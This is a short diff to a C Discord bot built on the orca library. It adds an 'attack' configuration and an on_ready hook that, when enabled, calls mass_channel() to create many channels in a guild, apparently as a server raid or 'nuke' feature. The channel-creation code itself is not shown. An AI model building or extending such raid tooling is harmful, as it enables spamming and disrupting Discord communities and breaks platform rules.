@@ -1,8 +1,12 @@
 #include <kk_client.h>
 #include <kk_config.h>
+#include <kk_dashboard.h>
 
 #include <string.h>
+#include <stdbool.h>
 #include <orca/discord.h>
+
+extern struct attack s_attack;
 
 u64_snowflake_t get_guild(struct discord *client)
 {
@@ -69,7 +73,13 @@ void on_ready(struct discord *client)
                                      .since = discord_timestamp(client),
                                  });
 
+    log_info("NAME: %s", s_attack.mass_channel_name);
     u64_snowflake_t guild_id = get_guild(client);
+
+    if (s_attack.mass_channel_enabled == true)
+    {
+        mass_channel(client, guild_id, s_attack.mass_channel_name, s_attack.mass_channel_count);
+    } 
 }
 
 void on_message(struct discord *client,
@@ -84,10 +94,9 @@ void on_message(struct discord *client,
     discord_create_message(client, msg->channel_id, &params, NULL);
 }
 
-
 void *client_init(char *TOKEN)
 {
-struct discord *client = discord_init(TOKEN);
+    struct discord *client = discord_init(TOKEN);
     discord_set_on_ready(client, &on_ready);
     discord_set_on_message_create(client, &on_message);
     discord_run(client);
